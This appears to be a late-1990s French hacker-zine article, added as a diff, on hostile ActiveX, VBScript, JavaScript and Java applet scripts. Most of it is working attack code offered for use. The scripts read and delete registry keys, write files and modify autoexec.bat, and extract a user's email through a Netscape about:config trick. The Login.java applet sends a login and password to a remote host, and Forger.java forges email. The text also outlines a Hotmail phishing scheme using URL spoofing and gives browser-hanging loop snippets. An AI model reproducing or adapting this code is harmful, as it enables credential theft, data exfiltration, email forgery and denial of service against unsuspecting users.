@@ -1,0 +1,664 @@
+{-----------------------------------------------------------------------------}
+		             %% UNSECURE ACTIVE-X %%
+		          Malicious & hostile scripts...
+				      **			 
+			    by DataHck & Cyberyo
+{-----------------------------------------------------------------------------}
+
+
+%% iNTRO %%
+
+	Il vous est surement arrive lorsque vous vous connectez sur un site web 
+de devoir confirmer si vous voulez faire confiance au site web en question. 
+
+Souvent se cache un programme activeX derriere cette URL. Ce texte est la pour 
+vous expliquer ce que ce genre de scripts peut faire.
+
+Plusieurs "langages" sont exploitables : VBScript, Java, JavaScript...
+On va voir comment les serveurs peuvent recuperer des infos sur leurs clients...
+
+%% aCTiVE-X ? Enjoy ! %%
+
+Les actions les + interessantes concernent evidemment les filez (operations 
+d'I/O), l'OS (sploits/DoS) et les infos du client (ip,services..) comme par
+exemple :
+
+Creer/Supprimer un cookie
+Creer/Supprimer une cle dans la base de registre
+Lire la valeur d'une cle dans la base de registre
+Creer/Lire/Supprimer? un fichier
+Ouvrir une autre fenetre (woaw!)
+Fermer le browser (woooaawww!!!)
+Afficher l'ip du client
+Afficher l'hostname du client
+Afficher la version du browser
+Afficher les informations sur le systeme d'exploitation
+Afficher les proprietes du browser
+Afficher la configuration du browser
+Sniffer les urls ;)
+Spoofer une url
+Creer une connexion entre le client et le serveur (telnet,ftp,sendmail...) =)
+...
+
+Bon y'en a d'autres (crasher un client, killer un applet etc..) , mais on s'interessera
+k'a celles la car elles vont nous aider a faire une page html tres "curieuse".
+
+%% cOOKiES %%
+
+Les cookies...hummm...kel interet ? bin c simple, on va creer un cookie pour 
+'marquer' un client.
+
+/* -- begin -- */
+
+<html> 
+<head> 
+<title> Javascript Cookie </title>
+<SCRIPT LANGUAGE = "JavaScript">
+var username = GetCookie('username');
+if (username == null) {
+username = prompt('Entrez votre nom :',"Test");
+if (username == null) {
+username = 'Test';
+} else {
+pathname = location.pathname;
+myDomain = pathname.substring(0,pathname.lastIndexOf('/')) +'/';
+var largeExpDate = new Date ();
+largeExpDate.setTime(largeExpDate.getTime() + (365 * 24 * 3600 * 1000));
+SetCookie('username',username,largeExpDate,myDomain);
+   }
+}
+function getCookieVal (offset) {
+var endstr = document.cookie.indexOf (";", offset);
+if (endstr == -1)
+endstr = document.cookie.length;
+return unescape(document.cookie.substring(offset, endstr));
+}
+function GetCookie (name) {
+var arg = name + "=";
+var alen = arg.length;
+var clen = document.cookie.length;
+var i = 0;
+while (i < clen) {
+var j = i + alen;
+if (document.cookie.substring(i, j) == arg)
+return getCookieVal (j);
+i = document.cookie.indexOf(" ", i) + 1;
+if (i == 0)
+break;
+}
+return null;
+}
+function SetCookie (name, value) {
+var argv = SetCookie.arguments;
+var argc = SetCookie.arguments.length;
+var expires = (argc > 2) ? argv[2] : null;
+var path = (argc > 3) ? argv[3] : null;
+var domain = (argc > 4) ? argv[4] : null;
+var secure = (argc > 5) ? argv[5] : false;
+document.cookie = name + "=" + escape (value) +
+((expires == null) ? "" : ("; expires=" +
+expires.toGMTString())) +
+((path == null) ? "" : ("; path=" + path)) +
+((domain == null) ? "" : ("; domain=" + domain)) +
+((secure == true) ? "; secure" : "");
+}
+</SCRIPT>
+<BODY>
+<CENTER>
+<SCRIPT>
+document.write('<font size="+3">Yo '+username+'!</font>');
+</SCRIPT>
+<font size="+3">your browser is :</font>
+<SCRIPT>
+document.write('<br> '+ navigator.appName + ' (<i>' + navigator.appCodeName + '</i>) version ' + navigator.appVersion + '.')
+</SCRIPT>
+</CENTER>
+</head> 
+</body> 
+</html>
+
+/*--- end ---*/
+
+On peut donc ecrire des cookies, les lire et les supprimer comme on veut (ou 
+presque ;)).
+C'est-a-dire k'on peut stocker des infos sur un client, pour un usage ulterieur
+;) et comme IE a le accept-cookies enabled par defaut bahhh le client sera meme
+pas prévenu..
+
+
+%% bASE dE rEGiSTRE %%
+
+Bon, la on va taper carrement dans le vol d'information =)
+La base de registre (BDR) et toutes les infos *sensibles* k'elle contient 
+notamment sur la machine et les softs...
+Bahh la c selon votre inspiration :) tout depend de ce ke vous voulez ;)
+Y'a des scripts ki existent en java, mais le plus simple c encore le vbscript.
+
+/*-- begin --*/
+
+<html><body> 
+<script Language="VBScript"> 
+Set WshShell = CreateObject("WScript.Shell") 
+document.writeln("<BR>" + WshShell.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner") +
+ <BR>") 
+</script> 
+</body> 
+</html> 
+
+/*--- end ---*/
+
+Vala, ce code retourne le nom de l'user courant.
+
+Ca c juste pour vous donner une idee, mais on peut *par exemple* voir si le 
+client est "infecte" par un trojan ki utilise la BDR ;)
+
+Le seul probleme c ke selon le browser et le niveau de securite, un prompt vous
+dira ke "Certains controles ActiveX ne sont peut-etre pas sur bla bla bla..."
+
+Pour la creation/suppression d'une cle, c aussi simple.
+
+/*-- begin --*/
+
+<html><body> 
+<script Language="VBScript"> 
+ if location.protocol = "file:" then 
+        Set WshShell = CreateObject("WScript.Shell") 
+        Set FSO = CreateObject("Scripting.FileSystemObject") 
+        HPath = Replace(location.href, "/", "\") 
+        HPath = Replace(HPath, "file:\\\", "") 
+        HPath = FSO.GetParentFolderName(HPath) 
+        Set TRange = document.body.createTextRange 
+        Set RealLink = WshShell.CreateShortcut("C:\WINDOWS\bureau\multimania.url") 
+        RealLink.TargetPath = "http://www.multimania.com/" 
+        RealLink.Save 
+end if 
+</script> 
+</body> 
+</html> 
+
+/*--- end ---*/
+
+Ce script cree un link vers www.multimania.com sur le bureau.
+
+/*-- begin --*/
+
+<html><body><script Language="VBScript"> 
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.RegDelete "HKEY_LOCAL_MACHINE\toto\"</script> 
+</body></html> 
+
+/*--- end ---*/
+
+Celui la delete la regkey 'toto'.
+
+
+
+
+%% fiLEZ %%
+
+Huhu...la ca devient interessant :)
+
+Creer un file :
+
+/*-- begin --*/
+
+<html><body> 
+<script Language="VBScript"> 
+ if location.protocol = "file:" then 
+        Set FSO = CreateObject("Scripting.FileSystemObject") 
+        HPath = Replace(location.href, "/", "\") 
+        HPath = Replace(HPath, "file:\\\", "") 
+        HPath = FSO.GetParentFolderName(HPath) 
+        Set TRange = document.body.createTextRange 
+        Set BatFile = FSO.CreateTextFile("c:\Windows\toto.bat", 2, False) 
+        BatFile.WriteLine "" 
+        BatFile.WriteLine "bonjour" 
+        BatFile.Close 
+ end if 
+</script> 
+</body></html> 
+
+/*--- end ---*/
+
+Bon la, *classique*, en vbscript, sous win.
+
+Le code html suivant determine si un fichier existe ou non :
+
+/*-- begin --*/
+
+<html><body>
+<object id="wm" WIDTH=0 HEIGHT=0 classid="clsid:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
+        </object>
+        <SCRIPT>
+        // -2147220970
+        function checkfile()
+        {
+        b=document.all.wm;
+        b.FileName=document.forms[0].elements[0].value;
+        if (b.ErrorCode == -2147220970)
+         alert("File does not exist")
+        else
+         alert("File exists");
+        }
+        </SCRIPT>
+        <FORM>
+        <INPUT TYPE="TEXT" VALUE="C:\AUTOEXEC.BAT" SIZE=60>
+        <INPUT TYPE="SUBMIT" VALUE="Check file" onclick="checkfile()">
+        </FORM>
+</body>
+</html>
+
+/*--- end ---*/
+
+
+%% hOLES %%
+
+Bon cette partie la j'ai hesite a la mettre, mais puisqu'elle est tres courte..
+On va juste parler de quelques security holes : ouvrir et fermer le browser.
+
+Ca peut paraitre derisoire a premiere vue mais k'est-ce ki se passe si on fait 
+une boucle ki ouvre sans arret des fenetres ?? :)
+
+Evidemment, y'a des filez genre AppletKiller.java, crashcom405.java etc... ki
+existent et ki font planter le browser par exemple, mais en ce ki nous concerne, 
+ca nous intéresse pas, non, on veut pas crasher le client, mais en savoir plus 
+sur lui 8)
+
+%% iNFOS cLiENT %%
+
+Haha! c pas croyable le nombre d'infos k'on peut collecter rien k'avec un 
+browser :)
+
+Ce script affiche les infos de votre browser, votre ip, et votre hostname :
+
+/*-- begin --*/
+
+<html> 
+<head> 
+<title> Infos Client </title> 
+<script LANGUAGE="JavaScript"> 
+Name = navigator.appName;
+Ver = navigator.appVersion;
+document.write('<FONT COLOR="#FF0000"><B>Client = ' + Name + ' ' + Ver +'.</B><BR><BR></FONT>');
+document.write('<FONT COLOR="#FF0000"><B>IP = ' + java.net.InetAddress.getLocalHost().getHostAddress() + '</B><BR><BR></FONT>');
+document.write('<FONT COLOR="#FF0000"><B>Name = ' + java.net.InetAddress.getLocalHost().getHostName() + '</B></FONT>');
+</script> 
+</head> 
+<body bgcolor="#000000" text="#FFFFFF" link="#FFB703" vlink="#FFB703" alink="#FFB703"> 
+</body> 
+</html>
+
+/*--- end ---*/
+
+On a donc les informations concernant la version du browser, l'OS, le code de 
+nationalite de la version.
+Humpf, on peut pousser encore plus loin :
+
+/*-- begin --*/
+
+<html> 
+<head>
+<body>
+<script language="JavaScript">
+var xy = navigator.appVersion;
+xz = xy.substring(0,4);
+document.write("<center><table border=1 cellpadding=2><tr><td>");
+document.write("<center><b>", navigator.appName,"</b>");
+document.write("</td></tr><tr><td>");
+document.write("<center><table border=1 cellpadding=2><tr>");
+document.write("<td>Code Name: </td><td><center>");
+document.write("<b>", navigator.appCodeName,"</td></tr>");
+document.write("<tr><td>Version: </td><td><center>");
+document.write("<b>",xz,"</td></tr>");
+document.write("<tr><td>Platform: </td><td><center>");
+document.write("<b>", navigator.platform,"</td></tr>");
+document.write("<tr><td>Pages Viewed: </td><td><center>");
+document.write("<b>", history.length," </td></tr>");
+document.write("<tr><td>Java enabled: </td><td><center><b>");
+if (navigator.javaEnabled()) document.write("sure is!</td></tr>");
+else document.write("not today</td></tr>")
+document.write("<tr><td>Screen Resolution: </td><td><center>");
+document.write("<b>",screen.width," x ",screen.height,"</td></tr>");
+document.write("</table></tr></td></table></center>");
+</script>
+</head> 
+</body> 
+</html>
+
+/*--- end ---*/
+
+La on a en plus le nombre de pages visitees, la resolution courante etc...
+Mais on peut bien sur, afficher TOUTES les variables =))
+(uniquement pour Netscape 4.x)
+
+/*-- begin --*/
+
+<HTML>
+    <BODY>
+    <SCRIPT>
+
+    s="view-source:wysiwyg://1/javascript:s='<TITLE>tttt</TITLE>vvvv>>"
+    +"<ILAYER SRC=\"view-source:wysiwyg://1/about:config\"></ILAYER>"
+    +" <SCRIPT>blur();msg1=\"Your email is: \"; mend=\"general.\"+\"title_tips\";mag=\"mail.identity.useremail\"+\" = \";sp=\" \";res=mag;charstoread=50;"
+    +"setTimeout(\" "
+    +"for(i=0;i<charstoread;i++) {"
+    +" t=res;"
+    +" find(mend);"
+    +" for(c=1;c<256;c++) {"
+    +"   t=res + String.fromCharCode(c);"
+    +"     if (find(t,true,true)) {"
+    +"      res=t;"
+    +"      if (c==32) i=charstoread+1"
+    +"     } "
+    +" }"
+    +"}"
+    +"res=res.substring(mag.length);"
+    +"alert(msg1 + res);"
+    +" ;\",3000);</"+"SCRIPT>'";
+    //a=window.open(s);
+    location=s;
+
+    </SCRIPT>
+    </BODY>
+    </HTML>
+
+/* --- end --- */
+
+
+%% wINDOWS sNiFFiNG %%
+
+On peut egalement 'sniffer' les urls des autres fenetres :)
+Allez faire un tour sur www.blackcode.com pour le code souce.
+
+
+%% wINDOWS sPOOFiNG %% 
+ 
+Ici, il s'agit simplement de faire croire a l'user k'il est sur une certaine 
+page dont l'adresse est spoofee (dans la barre de navigation). 
+
+On pourra s'en servir pour recuperer le pass d'un account sur hotmail.com 
+simplement en rippant la page d'hotmail, on cree un lien sur un site bidon 
+("Check ur hotmail mailbox from here!") et on spoof l'url www.hotmail.com, 
+l'user n'y voit ke du feu ;) 
+
+Allez voir l'article de Cedru dans deathlyby n°9 (Octobre)
+
+
+%% cONNEXION cLIENT-sERVEUR %%
+
+Arf, c peut-etre la meilleure face cachee du java ;)
+
+Ce script cree une connexion client-serveur ki transmet un l/p : 
+ 
+/*-- begin --*/ 
+ 
+/*  Login.java by Mark D. LaDue */ 
+/*  February 28, 1996 */ 
+/*  Copyright (c) 1996 Mark D. LaDue 
+    You may study, use, modify, and distribute this example for any purpose. 
+    This example is provided WITHOUT WARRANTY either expressed or implied.  */ 
+/*  This class allows the applet to communicate with its home. */ 
+ 
+import java.applet.Applet; 
+import java.awt.*; 
+import java.io.*; 
+import java.net.*; 
+ 
+public class Login { 
+ 
+    String home = new String("www.math.gatech.edu");         // Changer l'url 
+    int port = 7000; 					     // Changer le port 
+    String localhome = null; 
+    boolean debug = false; 
+    InetAddress localHome = null; 
+    String localAddress = null; 
+ 
+//  Construct the class 
+    Login(int port) { 
+        this.port = port; 
+    } 
+ 
+    public void communicate (String user, String pword) { 
+        Socket sock = null; 
+//      InputStream inStream; 
+// On cree une sortie uniquement ;)
+        OutputStream outStream = null; 
+        byte b[] = new byte[128]; 
+        int numbytes; 
+        String reply; 
+        StringBuffer sb = new StringBuffer(); 
+        InetAddress inaddress = null; 
+ 
+//      System.out.println("I'm up to no good"); 
+// Ici on cree le socket avec la destination (host+port) comme arguments.
+        try { 
+            sock = new Socket(home, port); 
+            outStream = sock.getOutputStream(); 
+        } 
+        catch (IOException ioe) { 
+            if (debug) 
+                System.out.println("I can't open a socket to " + home); 
+        } 
+        try { 
+            if (debug) 
+                System.out.println("Sending login and password to " + home); 
+            inaddress = sock.getInetAddress(); 
+// Si la destination est une ip, il faut la resoudre
+// On la convertit ensuite en string.
+            try { 
+                localHome = inaddress.getLocalHost(); 
+                localAddress = localHome.toString(); 
+            } 
+            catch (UnknownHostException u) { 
+                System.out.println("I can't get the remote host's name"); 
+            } 
+            sb.append(localAddress + "\t" + user + "\t" + pword + "\n");  
+            reply = sb.toString(); 
+            numbytes = reply.length(); 
+            reply.getBytes(0, numbytes, b, 0); 
+// On envoie les infos sur le socket
+            outStream.write(b, 0, numbytes); 
+        } 
+        catch (IOException ioe) { 
+            if (debug) 
+                System.out.println("I can't talk to " + home); 
+        } 
+    } 
+} 
+ 
+/*--- end ---*/ 
+ 
+On peut donc envoyer des infos (locales) a une hostname sur un port defini. 
+ 
+Le 2e exemple cree un mail grace au daemon sendmail du client : 
+ 
+/*-- begin --*/ 
+ 
+/* Forger.java by Mark D. LaDue */ 
+/* March 15, 1996 */ 
+/*  Copyright (c) 1996 Mark D. LaDue 
+    You may study, use, modify, and distribute this example for any purpose. 
+    This example is provided WITHOUT WARRANTY either expressed or implied.  */ 
+/*  This hostile applet forges an elctronic mail letter from the person who 
+    views the applet in a browser to the person whose address appears in the 
+    string "toMe."  The return address will be listed as HostileApplets@ 
+    followed by the string "mailFrom."  The appropriate commands to use for 
+    sendmail can be often be found in the file /etc/mail/sendmail.hf.   
+    Note that while the person viewing the applet actually does initiate 
+    the mail by connecting (involuntarily) to port 25, the applet host's role 
+    in sending it is not so easily hidden.  See the full header of any e-mail 
+    letter sent by the applet for more details. */  
+ 
+import java.applet.*; 
+import java.io.*; 
+import java.net.*; 
+ 
+public class Forger extends java.applet.Applet implements Runnable {  
+ 
+    public static Socket socker; 
+    public static DataInputStream inner; 
+    public static PrintStream outer; 
+    public static int mailPort = 25 ; 
+    public static String mailFrom = "localhost.com"; 
+    public static String toMe = "datahck@mail.com"; // Change this! 
+    public static String starter = new String(); 
+    Thread controller = null; 
+ 
+    public void init() { 
+ 
+	try { 
+	    socker = new Socket(getDocumentBase().getHost(), mailPort); 
+	    inner = new DataInputStream(socker.getInputStream()); 
+	    outer = new PrintStream(socker.getOutputStream()); 
+        } 
+        catch (IOException ioe) {} 
+    } 
+ 
+    public void start() { 
+        if (controller == null) { 
+            controller = new Thread(this); 
+            controller.setPriority(Thread.MAX_PRIORITY); 
+            controller.start(); 
+        } 
+    } 
+ 
+    public void stop() { 
+        if (controller != null) { 
+            controller.stop(); 
+            controller = null; 
+        } 
+    } 
+ 
+    public void run() { 
+        try { 
+            starter = inner.readLine(); 
+        } 
+        catch (IOException ioe) {} 
+        mailMe("HELO " + mailFrom); 
+        mailMe("MAIL FROM: " + "HostileApplets@" + mailFrom); 
+        mailMe("RCPT TO: " + toMe); 
+	mailMe("DATA"); 
+        mailMe("Subject: About PenPal.java" + "\n" +"Hi !"  + "\n" + "\n" + "Diz is a test.\n" + "\n." + "\n");  
+        mailMe("QUIT"); 
+        try { 
+            socker.close(); 
+        } 
+        catch (IOException ioe) {} 
+    } 
+ 
+    public void mailMe(String toSend) { 
+        String response = new String(); 
+        try { 
+            outer.println(toSend); 
+            outer.flush(); 
+            response = inner.readLine(); 
+        } 
+        catch(IOException e) {} 
+    } 
+} 
+ 
+/*-- end --*/ 
+ 
+Bien sur c du code brut, suffit de remplacer qq variables avec celles du 
+client et hop, a y'est. (applet avec parametres) 
+
+
+%% cONCLUSiON %%
+
+Nous sommes vulnerables.
+
+J'ai presente ici toutes les 'armes' necessaires pour obtenir, transmettre et 
+stocker des infos sur un client.
+
+Vi, de nombreux organismes comme la CNIL (Commission Nationale Informatique & 
+Libertes) attirent l'attention sur l'exploitation de ces donnees par des 
+societes commerciales.
+"Ouais mais ca jle savais k'on etait logge!"
+Huhu...la c pas un log, c carrement un fichier ://
+
+Argg...par manque de temps j'ai pas pu faire la page html avec la demo de tout 
+ca, ok pas grave, on verra ca la prochaine fois.
+
+%% gREETZ %%
+
+da gr33tz 2:
+lionel, shado, cyberyo, damocles, jacko, exolon, dark_will, prfalken, lunack, 
+franck, shid, retep, nooon, krapu, wolverine, lacrampe, crapule, yawn, hegemoon, 
+bedlam, #scenefr, #demofr, #organiks, #chx, #reseau, #galaad, #bsdfr...bon stop, 
+j'en ai marre ;)
+
+	Datahck
+
+
+	Bon Datahck a terminé sa partie. C à mon tour. Nous avons remarqué que nos 
+articles se ressemblaient. Donc nous sommes regroupés ;)
+Je v vous parler du code ActiveX compilé et du vbscript :
+ Vous avez surement entendu que les scripts activeX sont tres puissants. Certains 
+ont meme detourne de l'argent avec. Mais ils peuvent faire beaucoup de choses
+comme utiliser vos fichiers pour les envoyer a quelqu'un par mail ou les modifier 
+ou encore les effacer. Ceci n'est qu'une partie de leur pouvoir. Vous pouvez 
+réaliser toute une application grace a ceux ci.
+Prenons un exemple. Avec visual basic 6.0 vous pouvez creer des scripts activeX
+compilé. Il suffitde creer l'inferface ( boutons, ... ). Disons que l'on 
+veuille modifier l'autoexec.bat d'un individu. L'individu malicieux peut simuler 
+l'inscription a une mailing list par exemple et associer au bouton envoyer le 
+code suivant :
+
+open "c:\autoexec.bat" for append as #1
+print #1,"Rem voila la phrase rajoutee"
+close #1
+
+seulement 3 lignes de code permette de modifier l'autoxec.bat de l'individu. Mais 
+le scripts pourrait ouvrir un fichier sans interruption pour saturer l'OS de
+la personne.
+do
+shell "c:\autoexec.bat",1
+loop
+
+Encore un exemple de scripts rapide et efficace. Il pourrait aussi creer des milliers
+de fichiers dans un repertoire grace a la command open. Les possibilites sont enormes !
+Il peut tester si tel ou tel fichier est present grace a une commande du style 
+bob$=dir("fichier a verifier") et effectuer une action si celui est la 
+( if bob<>"" then ... )
+
+Ces differents exemples sont plutots dangereux pour un visiteur mais grace a l'activeX 
+on peut aussi creer des applications completes ( chat-room avec winsock par exemple 
+ou traitement de texte ou des scanners ) Toutes l'imagination du programmeur peut
+etre mise en oeuvre ) 
+
+le vbscript
+
+Ce sont des petits scripts comme le javascripts assez sympa sur les sites web. 
+Mais il est possible d'en renconter des malicieux aussi. Je v vous donner un 
+exemple :
+<script language=vbscript>
+sub test()
+bob=inputbox("Quel est ton nom ???',"Quel est nom ???")
+if bob="jacques" then
+do 
+loop
+end if
+end sub
+</script>
+<body onload="test()">
+
+Ici le browser vous demande un nom
+Si celui ci est jacques alors votre browser va ramer :))
+
+J'espere que ça vous avez aimé. Le web étant de plus en plus " puissant ", il est
+il est portant de connaitre sa sécurité. 
+
+Maintenant vous surferez en faisant attention ! ( ne devenez po parano qd meme :))) )
+La prochaine fois je vous ferez un chtit article sur le PHP3. @ bientôt !!!
+               
+               cyberyo .
+
+ Greets
+
+shado, datahck, lionel, prfalken,  OrganiKs, #chx, #banane, #linuxfr, 
+Toute la scène, les coders et tous ceux que g oubliés.
+
+
+//////////////////////////////////////////////////////////////////////////////////////
+         			       The ENd
+//////////////////////////////////////////////////////////////////////////////////////         	
